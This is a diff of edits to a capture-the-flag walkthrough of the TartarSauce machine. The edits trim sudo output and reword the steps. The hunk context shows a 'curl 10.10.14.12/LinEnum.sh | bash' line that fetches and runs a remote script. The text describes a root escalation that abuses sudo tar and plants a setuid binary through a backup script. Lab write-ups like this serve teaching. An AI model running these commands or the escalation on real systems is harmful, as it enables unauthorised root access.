@@ -113,11 +113,10 @@ curl 10.10.14.12/LinEnum.sh | bash
 
 The sudo privileges of _www-data_ is allowing the execution of `tar` as the user _onuma_ without a password:
 ```markdown
-www-data@TartarSauce:/$ sudo -l
-Matching Defaults entries for www-data on TartarSauce:
-    env_reset, mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+sudo -l
 
+# Output
+(...)
 User www-data may run the following commands on TartarSauce:
     (onuma) NOPASSWD: /bin/tar
 ```
@@ -144,8 +143,7 @@ It was found in _/usr/sbin/backuperer_ and is a bash script that does the follow
 2. `tar` _/var/www/html_ to _/var/tmp/$RANDOM_NAME_ in the background
 3. `sleep` for 30 seconds
 4. Extract created files and integrity check between _/var/www/html_ and _/var/tmp/check/var/www/html_ with `diff`
-5. If integrity check is successful, exit with error exit code (2)
-  - Else, delete files and exit with successful exit code (0)
+5. If integrity check is successful, exit with error exit code (2). Else, delete files and exit with successful exit code (0)
 
 If a directory is not valid, it will fail and delete the files.
 If all directories exist, it will exit out of the program and what we have to figure out now, is how to make the integrity check fail to get to that state.
@@ -156,7 +154,7 @@ cd /var/tmp
 mkdir -p var/www/html
 ```
 
-To get command execution we place a file with the _setuid bit_ in there, because `tar` keeps the file permissions even after extracting.
+To get command execution we place a binary with the _setuid bit_ in there, because `tar` keeps the file permissions even after extracting.
 So when it gets extracted, the binary will keep the _setuid bit_ and is executable as root.
 
 I will compile this code that creates a binary with the correct file permission that runs _/bin/sh_:
